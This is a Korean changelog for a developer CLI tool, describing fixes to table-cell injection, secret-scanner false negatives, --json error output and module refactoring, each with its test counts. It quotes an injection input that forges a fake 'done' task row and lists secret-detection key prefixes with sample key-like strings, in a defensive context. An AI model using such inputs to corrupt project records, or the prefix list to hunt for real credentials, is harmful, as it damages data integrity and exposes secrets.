- **`_lineSafe(s)`** 순수 헬퍼(개행→공백, 파이프는 보존 — 표 아님): `_renderDecisionsMd`/`_renderLessonsMd` 의 head + 각 필드에 적용. canonical JSON 은 raw 유지(다줄 보존), MD projection 만 단일라인화 → 위조 블록 주입 차단.

### 검증 (회귀 0)
- **selftest 147→148 PASS** (_lineSafe + 개행 title 렌더→reparse 1개 + 별도 ### 헤더 부재 + lessons 동일).
- **E2E 340→341 PASS** (decision add 개행 → decisions.md 별도 ### 2099 헤더 없음 + MD-fallback context 결정 1개).
- 실측: ### 4→2(위조 0), reparse 1개, title 'a\\nb'→'a b'.

### 테이블셀 injection 클러스터(UR-0104/0108) 완결: task/rule(파이프+개행) + decisions/lessons(개행).

## 1.9.401 — 2026-06-07 — 시크릿 스캐너 FN 2종: gitignore 부정(!) + placeholder substring 정밀화 (7번째 버그헌트 P1-C, UR-0106)

**🔐 보안 — 커밋되는 파일의 실제 시크릿을 놓치던 false-negative 2종 수정.**

### 배경 (7번째 버그헌트 P1-C · 직접 재현 검증)
1. **gitignore 부정(!) 미처리**: `*.example` + `!.env.example` 일 때 git 은 `.env.example` 을 커밋(! 해제)하지만, leerness 는 `!` 라인을 무시해 `.env.example` 을 "gitignored(안전)"로 오분류 → 그 안의 실제 시크릿을 비실패(info)로 강등 = FN.
2. **placeholder substring 오억제**: `_isPlaceholderSecret` 가 `value.includes('example')` 등 부분문자열로 판정 → `sk-EXAMPLEab12...`, `sk-proj-realKEYexample99..` 같은 **실제 키**가 'example' 포함만으로 placeholder 로 억제 = FN.

### 구현
- **`_gitignoreMatch`**: 부정(`!`) 패턴 + last-match-wins(git 실제 동작) 구현. `!` 매칭은 un-ignore. → `!.env.example` 커밋대상 정확 판정.
- **`_isPlaceholderSecret`**: 실키 가드 추가 — 알려진 키 prefix(sk-/AKIA/ghp_/xox../AIza/glpat-/-----begin) 또는 고엔트로피(영숫자 24+ & 고유문자 12+)면 substring placeholder 신호 무시. 반복문자/짧은 placeholder 는 그대로 억제.

### 검증 (회귀 0)
- **selftest 146→147 PASS** (gitignore 부정/last-match + placeholder 7케이스 실키↔placeholder 구분).
- **E2E 339→340 PASS** (!.env.example 시크릿 탐지 exit1 + 'EXAMPLE' 포함 실키 비억제 탐지).
- 실측: git check-ignore 교차확인 + 기존 동작(.env 강등) 보존.

### #25(per-pattern break 다중시크릿 under-count, P2)는 후속.

## 1.9.400 — 2026-06-07 🎉 — anti-laziness 명령 --json 에러 구조화 (7번째 버그헌트 P1-B, UR-0105)

**🔌 verify-claim / optimism-check / honesty-check 의 `--json` 에러도 구조화 JSON — AI 에이전트 self-gate 검증 명령의 자동화 신뢰성.**

### 배경 (7번째 버그헌트 P1-B · failJson 패턴 확대)
버그헌트: 위 3개 anti-laziness 검증 명령(AI 에이전트가 자기 검증에 사용)이 없는 T-ID 에 `--json` 으로 호출 시 `✗ ... 없음` 텍스트를 stdout 에 출력 → JSON.parse 크래시. 1.9.398 의 failJson 헬퍼를 이들에 확대 적용.

### 구현
- verify-claim / optimism-check: missing_args / not_found 를 `failJson(_j, ...)` 로.
- honesty-check: T-ID not_found 를 failJson 로.
- 사람용 출력(--json 없을 때) 무변경.

### 검증 (회귀 0)
- **selftest 145→146 PASS** (3개 명령 failJson 와이어 소스 확인).
- **E2E 338→339 PASS** (3개 --json 에러 → {ok:false,code:not_found} exit1 + 사람용 ✗ 텍스트 보존).

## 1.9.399 — 2026-06-07 — 테이블셀 injection 차단: task/rule 파이프·개행 (7번째 버그헌트 P1-A, UR-0104)

**🛡 데이터 무결성 — task/rule 텍스트의 파이프(|)·개행(\\n)이 progress-tracker/rules.md 표를 손상·가짜행 주입·멱등성 무력화하던 것을 차단(셀 이스케이프).**

### 배경 (7번째 — 내부 멀티에이전트 버그헌트, 외부리뷰 초월)
38 에이전트 포괄 버그헌트(31후보→confirmed 30/refuted 1)가 외부 리뷰(codex/Opus)가 못 본 **테이블셀 injection 클래스**를 발견. 직접 재현 검증:
- `task add 'fix login | bypass'` → progress-tracker 행 컬럼 시프트, update 시 영구 절단(JSON 백업 없음).
- `task add '...\\n| T-9999 | done | ...'` → 가짜 done 행 주입 + 실제 task 무성 소실.
- `rule add 'a | b'` → rules.md 컬럼 밀림 + dedup(1.9.212) 무력화로 중복 룰 무한 생성.

### 구현
- **`_cellSafe`/`_cellUnescape`** 순수 헬퍼(lib/pure-utils.js): 쓰기 시 개행→공백 + `|`→`\\|`, 읽기 시 비이스케이프 파이프(`/(?<!\\)\\|/`)에서만 분리 후 `\\|`→`|` 복원.
- 적용: `writeProgressRows`/`readProgressRows`(task) + `writeRules`/`readRules`(rule). 사용자 텍스트의 파이프는 **보존**(복원), 개행은 공백화(행 주입 차단).

### 검증 (회귀 0)
- **selftest 144→145 PASS** (cellSafe/Unescape reference-equality + 파이프 round-trip + 개행 제거 + 와이어).
- **E2E 337→338 PASS** (task 파이프 보존/개행 가짜행 차단 + rule 파이프 보존/멱등 회복/status 비오염).
- 실측: `task add 'fix login | bypass'` 원본 보존, 개행 주입 T-9999 차단, rule 중복 add → skip(멱등).

### 다음(같은 클러스터): decisions/lessons MD projection 셀 안전화(UR-0104 잔여, JSON canonical 은 이미 안전).

## 1.9.398 — 2026-06-07 — --json 에러 경로 구조화 (6번째 외부평가 P1-C, UR-0099)

**🔌 `--json` 모드에서 에러도 구조화 JSON(`{ok:false,error,code}`) — AI 에이전트가 에러 경로에서 JSON.parse 실패하지 않도록.**

### 배경 (6번째 외부평가 codex P1-C · UR-0085/0088 의 에러판)
codex: `contract verify --json`(인자 누락) / `feature show F-9999 --json`(없는 ID) 등이 에러 시 사람용 텍스트(`✗ ...`)를 출력 → 자동화가 JSON.parse 크래시. UR-0085/0088 이 성공/빈 경로를 구조화했으나 **에러 경로**가 남아 있었음.

### 구현
- `failJson(jsonMode, code, msg)` 헬퍼 신규(lib/io.js): jsonMode 면 `{ok:false,error,code}` + exit1, 아니면 사람용 `fail()`. 양쪽 exit 1.
- 적용: `contract verify`(missing_args/spec_not_found/impl_not_found), `feature show`/`feature impact`(bad_id/not_found). 사람용 출력 무변경.

### 검증 (회귀 0)
- **selftest 143→144 PASS** (failJson reference-equality + json/human 분기 + exit1 + 와이어).
- **E2E 336→337 PASS** (contract verify --json → code:missing_args / feature show --json → code:not_found, 둘 다 exit1 + 사람용 텍스트 보존).

## 1.9.397 — 2026-06-06 — install-safety 레시피 셸-무관화 (6번째 외부평가 P1-A, UR-0098)

**🪟 install-safety 안전설치 레시피를 셸-무관으로 — Windows PowerShell(주환경)에서 깨지던 POSIX env-prefix 제거.**

### 배경 (6번째 외부평가 codex P1-A · 비판검토 후 채택)
codex 가 레시피의 `npm_config_ignore_scripts=true npx ...`(bash env-prefix)가 PowerShell 에서 실패한다고 지적. **직접 검토**: PowerShell 비호환은 실문제(Windows 주환경)이나 "update 단계 ignore-scripts 누락"은 저가치(leerness 는 0 deps/0 install-script 라 실행될 스크립트 없음). → **셸 호환만 핵심 수정**.

### 구현
- safeInstall 레시피: `npm_config_x=true npx ...`(POSIX) → `npx --yes leerness@latest ...`(셸 무관). PowerShell/cmd/bash 모두 동작.
- `hardeningNote` 신규: leerness 자체 0-script 명시 + 일반 npx 하드닝(타 패키지 대비)을 셸별로 안내(bash/PowerShell/cmd). 사람용 출력에도 노출.

### 검증 (회귀 0)
- **selftest 142→143 PASS** (safeInstall 에 POSIX env-prefix 부재 + npx --yes 2건 + hardeningNote PowerShell 언급).
- **E2E 335→336 PASS** (install-safety --json 셸-무관 + hardeningNote).

## 1.9.396 — 2026-06-06 — 6번째 외부 멀티모델 리뷰 + task drop 데이터 손상 수정 (UR-0097)

**🔬 6번째 외부 클린룸 리뷰(codex GPT-5.5 + Opus) — findings 7건 등록 + 최우선 데이터 손상(task drop) 즉시 수정.**

### 6번째 외부 멀티모델 클린룸 리뷰
백로그가 상당히 소진되어, 깨끗한 경로에 leerness@1.9.395 를 설치하고 codex CLI(GPT-5.5) + Opus(현재 에이전트)로 객관 리뷰(Claude 헤드리스 401 로 sonnet 별도 세션은 불가, 2모델). "맹신 X" 로 각 발견을 직접 재현.
- 발견 7건(P0 0 · P1 4 · P2 3) → UR-0097~0103 등록. 상세: `_reports/_extreview6-consolidated-1.9.395.md`.

### 수정 (P1-B, UR-0097 — 데이터 손상, 최우선)
- **task drop 없는 ID**: `task drop T-9999`(미존재) 가 `✓ task dropped` exit 0 + `| T-9999 | dropped | undefined |` 가짜 row 를 progress-tracker 에 기록 = **프로젝트 메모리 손상**.
- task update 는 `_requireInit` + 존재확인(없으면 fail/no-op)인데 task drop 만 누락.
- **수정**: task drop 에 동일 가드 추가 → 없는 ID = fail + exit 1 + **무변경**, 실제 task = 정상 drop.

### 나머지 P1(후속 라운드): install-safety PowerShell 레시피(UR-0098) · --json 에러 경로(UR-0099) · list positional path(UR-0100).

### 검증 (회귀 0)
- **selftest 141→142 PASS** (task drop 존재확인 가드 + init 가드).
- **E2E 334→335 PASS** (없는 ID drop fail+무변경 / 실제 drop 정상).

## 1.9.395 — 2026-06-06 — 행위검증 회귀가드: audit FP/FN + canonical 파이프 round-trip (UR-0096)

**🛡 광범위 행위검증으로 실 버그 탐색 — 신규 버그 0(성숙·견고 확인) + 가드 없던 2영역에 net-new 회귀 가드 추가.**

### 배경 (whats-new 버그 발견의 후속 — 행위검증 확대)
1.9.393 의 whats-new 버그가 행위검증의 실익을 보여줘, audit/version/canonical 핵심 로직을 구성된 시나리오로 광범위 검증:
- audit README배지 mismatch / current-state stale (FP/FN) · compareVer(multi-digit 6종) · parseHarnessVersion(계약) · decisions/lessons round-trip(파이프/em-dash/콜론) — **모두 정상, 신규 버그 0**.

### 구현 (정직: no-op/가짜수정 안 만듦 — 미가드 영역 보강만)
- **e2e B(1.9.395)**: audit `readme_version_mismatch`(불일치 감지 + 일치 시 FP 0) + `current_state_stale`(2020 감지 + 오늘 FP 0) — 종전 전용 e2e 가드 부재였던 검증.
- **selftest**: decisions/lessons canonical round-trip 엣지문자(파이프 `|`=테이블 구분자/em-dash/콜론) 무손상 + idempotent — 데이터 손상 회귀 가드.

### 검증 (회귀 0)
- **selftest 140→141 PASS** · **E2E 333→334 PASS**.
- compareVer 17곳 기존 가드 + 신규 2가드 = audit/canonical 커버리지 보강.

## 1.9.394 — 2026-06-06 — UR-0025: whatsNewCmd → lib/diagnostics.js (whats-new 완결) + 파서 형제버그 감사

**🧩 whats-new 핸들러를 lib/diagnostics.js 로 분리 — whats-new 서브시스템 완전 모듈화. + /m `$` 절단 버그 클래스 전수 감사(클린).**

### 배경
1.9.393 에서 whats-new 파서(`_parseChangelogBetween`)를 pure-utils 로 빼고 버그 2건을 고쳤다. 후속으로 (1) **같은 부류의 형제 버그 감사** + (2) whatsNewCmd 핸들러 자체 분리로 서브시스템을 완결.

### 구현
1. **파서 형제버그 감사**: `|$)` lookahead + `/m` 조합으로 줄끝 절단되는 정규식을 전수 검색. 다른 5개(`Tasks:` 섹션 / `## Incomplete` / env-family / secret value / lang) 는 모두 `/m` 미사용이거나 `$`=문자열끝으로 **올바름** → 형제 버그 없음(no-op 릴리스 안 만듦).
2. **whatsNewCmd → lib/diagnostics.js**: introspection 핸들러(~58줄) 이전. require: `./io`(absRoot/exists/read/log/fail) · `./pure-utils`(parseHarnessVersion/_parseChangelogBetween) · node path. DI: VERSION/arg/has. CHANGELOG 경로 fallback `lib/../CHANGELOG.md`(= pkg 루트, bin/ 과 동일).
3. harness thin wrapper. dispatch·동작·출력·exit code 무변경.

### 검증 (회귀 0)
- **selftest 139→140 PASS** (lib/diagnostics whatsNewCmd export + 위임 와이어 + lib 본문 이동 + behavioral: tmp CHANGELOG `--from 1.9.49 --to 1.9.50 --json` → 1 version).
- **E2E 333 유지 PASS** (whats-new B(1.9.393) + 회귀). 락 flake 시 재실행.
- 실측: whats-new --from 1.9.388 --json(5 versions) · 사람용 · --from 누락 exit1 보존.

## 1.9.393 — 2026-06-06 — whats-new 파서 BUG-fix + _parseChangelogBetween → pure-utils (UR-0025/UR-0094)

**🐞 `whats-new` 가 현재 CHANGELOG 형식(`## X — DATE — title`)에서 0건 반환하던 버그 수정 + 파서를 lib/pure-utils.js 로 추출.**

### 배경 (UR-0025 모듈화 중 실사용 버그 발견)
whats-new 의 순수 파서 `_parseChangelogBetween` 를 pure-utils 로 추출하려다 자체 검증에서 **실사용 버그 2건** 발견(추출은 byte-identical 이라 회귀 아님 — 기존부터 깨져 있었음):
1. **헤더 미파싱**: 헤더 꼬리 정규식 `\s*\n` 이 `## X — DATE — title` 의 ` — title` 를 소비 못 해 현재 CHANGELOG 형식에서 **0개 섹션** 반환(`whats-new --from 1.9.388` → 0 versions).
2. **body 첫줄 절단**: body 캡처 `([\s\S]*?)(?=^##…|$)` 의 `$` 가 `/m` 모드에서 **줄 끝**과 매칭 → body 가 첫 줄로 잘림(①이 헤더를 막아 가려져 있던 잠재 버그).

### 구현
- `_parseChangelogBetween` 를 `_parseFeatureGraph` 식 **위치 기반 분할**로 재작성: 헤더 정규식으로 위치 수집 → 다음 헤더(또는 끝)까지 body 전체 slice. `## X` / `## X — DATE` / `## X — DATE — title` 모두 매칭, 다중줄 body 보존.
- pure-utils 로 추출(738 update 경로 + whats-new 공유) + harness 인라인 제거 + import.

### 검증 (회귀 0)
- **selftest 138→139 PASS** (reference-equality + `## X — DATE — title` 파싱 + 명령/플래그/파일 추출 + 제목없음 헤더 + 인라인 제거).
- **E2E 332→333 PASS** (실제 CHANGELOG whats-new `--from 1.9.388` ≥1 versions + 제목있음/없음 헤더 + 다중줄 body).
- 실측: whats-new --from 1.9.388 = **0 → 4 versions**(1.9.389~392), body 17줄 전체 캡처.

## 1.9.392 — 2026-06-06 — UR-0025 큰 핸들러 모듈화 4번째: doctor/which → lib/diagnostics.js (DI)

**🧩 네 번째 핸들러 모듈 — 진단 명령(doctor/which)을 lib/diagnostics.js 로 분리.**

### 구현
1. **lib/diagnostics.js 신규**: doctorCmd + whichCmd 이전.
   - 직접 require: `./io`(log) · node child_process.
   - **DI 주입**: VERSION · _selfTestCases · _detectShellCtx · _mcpToolCount · has · harnessPath.
   - `_selfTestCases` 의 각 case.run 클로저는 harness 모듈 스코프를 유지 → 함수 참조 주입만으로 정상 동작.
2. **harness thin wrapper**: deps 구성 후 위임. dispatch·동작·출력·exit code 무변경.

### 검증 (회귀 0)
- **selftest 137→138 PASS** (lib/diagnostics 2 exports + 위임 와이어 + lib 본문 이동 교차참조 + behavioral: stub _selfTestCases(빈 배열)로 lib doctorCmd 호출 → 재귀 회피 + report.version/selftest/healthy/mcpTools 검증).
- **E2E 332 유지 PASS** (doctor/which 회귀). 락 flake 시 재실행.
- 실측: doctor(--json selftest 137/137 healthy + 사람용 + exit0) · which(--json runningFrom/diagnostics + 사람용) 보존.

## 1.9.391 — 2026-06-06 — UR-0025 큰 핸들러 모듈화 3번째: feature → lib/feature.js (DI)

**🧩 세 번째 핸들러 모듈 — feature add/link/impact/list/show 를 lib/feature.js 로 분리. 1.9.390 순수 코어 토대 위에 완성.**

### 배경 (UR-0025, 사용자 승인 모듈화)
migrate(1.9.388)/team(1.9.389) 에 이어 세 번째. 1.9.390 에서 feature-graph 순수 코어를 pure-utils 로 뺀 덕에 이제 핸들러를 깨끗이 분리 가능.

### 구현
1. **lib/feature.js 신규**: 5 핸들러(add/link/impact/list/show) 이전.
   - 직접 require: `./io`(absRoot/log/ok/warn/fail) · `./pure-utils`(_nextFeatureId/_featureImpactBfs).
   - **DI 주입**: _ensureFeatureGraph · _readFeatureGraph · _writeFeatureGraph(feature-graph I/O 헬퍼) · arg · has.
2. **_featureImpactBfs → pure-utils**: 영향 BFS(affects/co-changes transitive + depends-on 역방향)는 순수 + handoff(8613)/audit(19302)도 공유 → pure-utils 로 이동, harness+lib 양쪽 import.
3. **I/O 헬퍼는 harness 유지**: _readFeatureGraph(7+곳 공유) 등은 그대로, deps 로 주입.
4. **harness thin wrapper**: _featureDeps() 구성 후 5 wrapper 위임. dispatch·MCP·동작·출력 무변경.

### 검증 (회귀 0)
- **selftest 136→137 PASS** (lib/feature 5 exports + _featureImpactBfs reference-equality + BFS 동작 + 위임 와이어 + lib 본문 이동 교차참조 + behavioral list --json).
- **E2E 332 유지 PASS** (feature add/link/impact/list/show + 공유 _featureImpactBfs(handoff/audit) 회귀). 락 flake 시 재실행.
- 실측: add(depends-on)·link(affects)·impact(transitive)·list·show(--json)·에러(BADID exit1)·handoff(공유 BFS) 보존.

## 1.9.390 — 2026-06-06 — UR-0025 모듈화: feature-graph 순수 코어 → pure-utils (feature 핸들러 분리 토대)

**🧩 feature-graph 의 순수 로직(템플릿/파서/ID/블록 렌더)을 lib/pure-utils.js 로 분리 — 가장 많이 공유되는 서브시스템의 핵심을 단일출처·테스트 가능화.**

### 배경 (UR-0025, 사용자 승인 모듈화)
migrate(1.9.388)/team(1.9.389) 핸들러를 lib 모듈로 뺐다. feature 서브시스템도 후보지만, `_readFeatureGraph` 가 audit/health/handoff 등 **7+곳에서 공유**돼 핸들러를 통째로 옮기기 전에 순수 코어부터 분리하는 게 안전(lib/io.js 토대를 먼저 만든 것과 동일 순서).

### 구현
1. **pure-utils 로 순수 4종 이전**: `_featureGraphTemplate`(템플릿) · `_parseFeatureGraph`(MD→nodes) · `_nextFeatureId`(다음 F-id) · `_featureBlock`(node→MD). 모두 I/O 없음.
2. **I/O 헬퍼는 harness 유지**: `_readFeatureGraph`(7+곳 공유) · `_writeFeatureGraph` · `_ensureFeatureGraph` · `featureGraphPath` — 이제 pure-utils 의 순수 함수를 import 해 사용.
3. harness 인라인 정의 제거 + import. 호출부·동작·출력 무변경.

### 검증 (회귀 0)
- **selftest 135→136 PASS** (reference-equality 4종 + 템플릿/파서/nextId 동작 + `_featureBlock`→`_parseFeatureGraph` round-trip + 인라인 제거 확인).
- **E2E 332 유지 PASS** (feature add/link/impact/list/show + 공유 _readFeatureGraph(audit/health/handoff) 회귀). 락 flake 시 재실행.
- 실측: add(F-0001/F-0002)·link(affects)·impact(transitive)·list(--json)·health(featureGraph) 보존.

## 1.9.389 — 2026-06-06 — UR-0025 큰 핸들러 모듈화 2번째: teamCmd → lib/team.js (DI)

**🧩 두 번째 핸들러 모듈 추출 — team 서브시스템(list/add/show/remove/preview/deploy)을 lib/team.js 로 분리. migrate(1.9.388)에서 확립한 DI 패턴 재사용.**

### 배경 (UR-0025 큰 핸들러 모듈화, 사용자 승인)
1.9.388 migrate 추출로 DI 패턴(io import + deps 주입)을 확립. 동일 패턴으로 두 번째 응집 핸들러 teamCmd(UR-0073, ~111줄, e2e 5건 보유)를 분리.

### 구현
1. **lib/team.js 신규**: teamCmd(6 서브명령) 이전.
   - 직접 require: `./io`(absRoot/log/ok/warn/fail/now) · `./pure-utils`(_composeTeamPlan/_teamDeployGate) · `./analyzers`(_shellGuardAnalyze) · node child_process.
   - **DI 주입**: VERSION · _loadTeams · _saveTeams · _detectShellCtx · arg · has(argv 파서).
2. **_loadTeams/_saveTeams 는 harness 유지**: handoff team reminders(_teamHandoffReminders)도 쓰는 공유 함수 → harness 에 두고 주입만. (teamsJsonPath/teamsPath/_renderTeamsMd 도 harness 유지.)
3. **harness thin wrapper**: deps 구성 후 위임. dispatch · 동작 · 출력 무변경.

### 검증 (회귀 0)
- **selftest 134→135 PASS** (lib/team export + 위임 와이어 + lib 본문 이동(pure-utils require/_teamDeployGate/하위명령) 교차참조 + behavioral list --json). 기존 1.9.371 케이스(_saveTeams/_loadTeams/_renderTeamsMd harness 유지)도 통과.
- **E2E 332 유지 PASS** (team B(1.9.371/372/373/376/378) list/add/preview/deploy-gate/MCP 회귀가 CLI→wrapper→lib 경로 검증). 락 flake 시 재실행.
- 실측: list/add/show/preview/deploy(dry-run·gated 이중게이트) + handoff team reminders(daily 팀 노출) 보존.

## 1.9.388 — 2026-06-06 — UR-0025 큰 핸들러 모듈화: migrate audit/apply/plan → lib/migrate.js (DI)

**🧩 첫 실제 핸들러 모듈 추출 — migrate 서브시스템(audit/apply/plan)을 lib/migrate.js 로 분리(의존성 주입 ctx). lib/io.js 토대(1.9.382/383)의 첫 활용.**

### 배경 (UR-0025 큰 핸들러 모듈화, 사용자 승인)
1.9.382/383 에서 lib/io.js(출력+fs 프리미티브 14종)를 만든 목적은 "핸들러를 별도 lib 모듈로 분리할 토대". 이번에 그 토대로 **첫 실제 핸들러**(migrate UR-0075, ~100줄, 응집적·e2e 3건 보유)를 추출.

### 구현
1. **lib/migrate.js 신규**: `migrateAuditCmd` / `migrateApplyCmd` / `migratePlanCmd` 이전.
   - I/O 프리미티브: `require('./io')`(absRoot/exists/read/log/ok/warn).
   - harness 고유 의존은 **deps 객체로 주입(DI)**: VERSION · compareVer · REQUIRED_WORKSPACE_FILES · canonical 메모리 함수 8종(decisionsPath/…/_save*) · harnessPath(plan 의 임시폴더 init spawn 용).
2. **harness thin wrapper**: `_migrateDeps()` 가 deps 1회 구성 → 3개 wrapper 가 위임. **호출부(dispatch)·동작·출력 무변경**.
3. 새 패턴 확립: 향후 다른 핸들러도 이 DI 방식으로 lib 모듈화 가능(io import + deps 주입).

### 검증 (회귀 0)
- **selftest 133→134 PASS** (lib/migrate 3 exports + harness 위임 와이어 + lib 본문 이동 확인 + behavioral audit JSON). 1.9.380 케이스는 REQUIRED_WORKSPACE_FILES 소비처가 harness+lib 로 분산됨에 맞춰 교차참조 카운트로 갱신.
- **E2E 332 유지 PASS** (기존 migrate B(1.9.356/357/358) audit/apply/plan CLI 회귀가 CLI→wrapper→lib 경로를 그대로 검증 — 신규 케이스 불필요). 락 flake 시 재실행.
- 실측: audit(정합 willChange:0 / canonical-pending 감지) · apply --yes(decisions.json 백필 복원) · plan(tempInstallOk:true) · 사람용 출력 보존.

## 1.9.387 — 2026-06-06 — --json 일관성 연장: incident/runs list 빈 케이스 구조화 (UR-0088)

**🔌 `incident list` / `runs list` 의 빈 상태도 `--json` 시 `{total:0,items:[]}` 출력 — AI 에이전트가 빈 프로젝트에서 사람용 텍스트를 파싱하다 실패하던 일관성 결함 해소.**

### 배경 (5번째 외부평가 UR-0085 테마 자체 확장)
status/verify --json(1.9.384) 수정 후, 나머지 읽기형 명령 12종의 --json 커버리지를 자체 점검. 10종은 정상이나 `incident list` / `runs list` 는 디렉토리 미존재(빈 프로젝트) 시 `--json` 검사 전에 사람용 텍스트(`(runs 없음 …)`)를 출력하고 조기 return → AI 에이전트가 JSON.parse 실패.

### 구현
- `runsListCmd` / `incidentListCmd` 의 빈 케이스 조기 return 을 `has('--json')` 인지하도록 수정 → 빈 케이스도 `{ total: 0, items: [] }`(데이터 케이스와 동일 스키마) 출력. `--json` 없으면 기존 사람용 텍스트 그대로.

### 검증 (회귀 0)
- **selftest 132→133 PASS** (incident/runs list 빈 케이스 behavioral --json 파싱 → total=0/items=[]).
- **E2E 331→332 PASS** (fresh init 에서 incident/runs list --json → `{total:0,items:[]}` + 사람용 텍스트(JSON 아님) 보존).
- 실측: 읽기형 12종 중 10종 기존 정상 + 2종 수정 = --json 일관성 완비.

## 1.9.386 — 2026-06-06 — 5번째 외부평가: secret scan env-family 포함 + gitignore git-일치 (UR-0087)

**🔐 `.env.bad` / `.env.local` / `.env.production` 등 env-variant 파일의 시크릿을 스캔 — 통째 스킵되던 보안 false-negative 해소 + gitignore 강등을 git 실제 동작에 맞춤.**

### 배경 (5번째 외부평가, GPT-5.5 web · "참고하되 맹신 X")
"secret scan 이 `.env.bad` 의 OpenAI-key-like 문자열을 놓쳤다." 자체 재현으로 **두 겹의 원인** 발견:
1. **스캔 제외(주원인)**: `.env.bad` 의 extname 은 `.bad`(.env.local→`.local`, .env.production→`.production`) 라 `SCAN_TEXT_EXT` 에 없어 **파일 자체가 스킵**. bare `.env`(extname `''`)만 스캔되고 있었음.
2. **과잉 강등**: 1.9.365(CV-6) 의 `.env` 관행 휴리스틱이 `.gitignore` 에 `.env` 만 있어도 모든 `.env.*` 를 보호(info 강등)로 처리 — 그러나 `git check-ignore .env.bad`(gitignore=`.env`) 는 **미무시(커밋 대상)**.

### 구현
1. **env-family 스캔 포함**: extname 대신 basename `/^\.env(\.|$)/` 매칭 → `.env` / `.env.local` / `.env.bad` / `.env.production` 모두 스캔.
2. **`_gitignoreMatch` + `_globToRe` 순수 추출**(lib/pure-utils.js, UR-0025): 정확매칭 / glob(`*`→`[^/]*`) / dir(`/`) 지원. 1.9.365 과잉 휴리스틱 제거 → **git 실제 동작 일치**: bare `.env` 는 `.env` 만 보호, `.env.bad` 는 커밋 대상(실패). `.env.*` / `.env*` 명시 시에만 `.env.bad` 보호.

### 검증 (회귀 0)
- **selftest 131→132 PASS** (`_gitignoreMatch` 15종 매트릭스 핵심 `.env↛.env.bad`=false + env-family 스캔 와이어 + reference-equality).
- **E2E 330→331 PASS** (① `.env.bad`+gitignore=`.env`→커밋대상 exit1 + ② `.env`→강등 exit0(CV-6 보존) + ③ `.env.bad`+gitignore=`.env.*`→glob 강등 exit0).
- 실측 15/15 gitignore 매칭(git 일치) + `git check-ignore` 교차확인.

## 1.9.385 — 2026-06-06 — 5번째 외부평가: contract verify markdown bullet 함수 파서 (UR-0086)

**📐 `contract verify` spec 파서가 markdown bullet `- name(args)` 함수 선언을 감지 — 실제 누락을 통과시키던 false-negative 해소.**

### 배경 (5번째 외부평가, GPT-5.5 web · "참고하되 맹신 X")
spec 파서가 `function name(...)` 와 backtick `` `name(` `` 만 추출하고 markdown bullet 목록(`- add(a,b)`)은 미감지. 자체 재현: bullet 3개 spec + impl 1개 export → `specFunctions: []`, `missingFunctions: []`, `ok: true`(실제론 2개 누락). **재현 후 수정**.

### 구현
1. **`_parseContractSpec(specText)` 순수 추출**(lib/pure-utils.js, UR-0025): `{ declared, mentioned, fields }`.
   - **declared**(강선언, 누락검사 대상): `function name(` + markdown bullet `- name(args)` / `* ` / `1. `.
   - **mentioned**(약언급, 표시만): backtick `` `name(` `` — 산문 인라인 언급 오탐 방지 위해 관대(기존 동작 유지).
2. **bullet 패턴**: `^\s*(?:[-*+]|\d+\.)\s+name(` — name 직후 `(`(공백 불허) + ASCII 식별자만 → 산문 `- 합계 (a+b)` / `- foo: bar(x)` / `**bold**` 오탐 0.
3. **missing-검출 잠재 FN 수정**: 기존 `specText.includes('function '+fn)` 가드가 bullet/backtick 추출명을 무력화 → `declaredSpec` 기준으로 교체(bullet 함수도 누락 감지, backtick 관대 유지).

### 검증 (회귀 0)
- **selftest 130→131 PASS** (bullet/asterisk/numbered 감지 + reference-equality + 산문 FP 0 + 인라인 제거 확인).
- **E2E 329→330 PASS** (bullet spec 3함수 감지 + subtract/multiply 누락 + add 보존 + backtick 관대 + 산문 FP 0).
- 실측 8/8 FP/감지 케이스 + 기존 B(1.9.35) `function bar`/`isCritical` 무회귀.

## 1.9.384 — 2026-06-06 — 5번째 외부평가: status/verify --json 구조화 출력 일관성 (UR-0085)

**🔌 `status --json` / `verify --json` 이 사람용 텍스트 → 구조화 JSON — AI 에이전트 자동화용 출력 일관성 확보.**

### 배경 (5번째 외부평가, GPT-5.5 web, 1.9.382 · "참고하되 맹신 X")
외부 평가가 #1 AI-에이전트 리스크로 지목: audit/health/task list 는 `--json` 시 JSON 인데 `status --json` 은 "Leerness: 1.9.x / Files: 56/56", `verify --json` 은 "✓ verify passed" 처럼 **사람용 텍스트**를 그대로 냄. 자체 재현으로 확인 후 수정.

### 구현
1. **status --json**: `{ version, language, minimal, total, present, missing[], healthy }` 구조화 출력(없으면 기존 사람용 유지).
2. **verify --json**: 실패를 `failures[]` 로 먼저 수집 → `{ ok, failures[], healthy }` 출력. **exit code 1 보존**(JSON·사람용 양쪽 모두 실패 시 exit 1).
3. 사람용 출력/동작 무변경(--json 없을 때 기존 `✗ ...` 메시지 + exit code 그대로).

### 검증 (회귀 0)
- **selftest 129→130 PASS** (status --json behavioral 파싱(total/present/healthy/missing) + verify --json 와이어 확인).
- **E2E 328→329 PASS** (status --json 구조 + verify --json pass(exit0)/fail(exit1) + 사람용 verify fail(exit1, JSON 아님) 보존).
- 실측: pass `{ok:true,failures:0}` exit0 / AGENTS.md 삭제 `{ok:false,failures:3}` exit1 / 사람용 `✗ ...` exit1.

### 5번째 외부평가 후속 (UR-0086 contract spec markdown-bullet 파서, UR-0087 secret .env.bad 정책)은 검증 후 별도 라운드.

## 1.9.383 — 2026-06-06 — UR-0025 큰 핸들러 모듈화 토대②: lib/io.js fs 프리미티브 분리

**🧩 lib/io.js 에 파일 I/O 프리미티브 추가 — 핸들러를 별도 lib 모듈로 분리할 토대 완비(io 14종).**

### 구현
1. **lib/io.js fs 프리미티브 추가**: `read`(BOM strip) / `readBuf` / `writeUtf8`(원자 temp→rename) / `exists` / `mkdirp` / `append` / `rel` / `absRoot`. io 모듈 14종(출력6+fs8) 완성.
2. **harness 인라인 정의 제거** → import 확장. **호출부 무변경**(이름 동일, 수천 호출 그대로).
3. e2e B(1.9.298) writeUtf8 원자성 소스체크 경로 `bin/harness.js` → `lib/io.js`(renameSync 이동 대응).

### 검증 (회귀 0)
- **selftest 128→129 PASS** (io fs exports 8종 + reference equality(read/writeUtf8/exists) + 인라인 제거 + writeUtf8→read round-trip + rel).
- **E2E 327→328 PASS** (직접 round-trip + decision add(writeUtf8)→context(read) consumer 보존).
- 실측: io 14종, init/decision→context round-trip, migrate plan(read 다수) 정상.

### 큰 핸들러 모듈화 토대 완비 → 이제 핸들러(migrate/team/audit)를 lib 모듈로 ctx-경량 분리 가능(io import 만으로 출력/파일 프리미티브 확보).

## 1.9.382 — 2026-06-06 — UR-0025 큰 핸들러 모듈화 토대: lib/io.js 출력·시간 프리미티브 분리

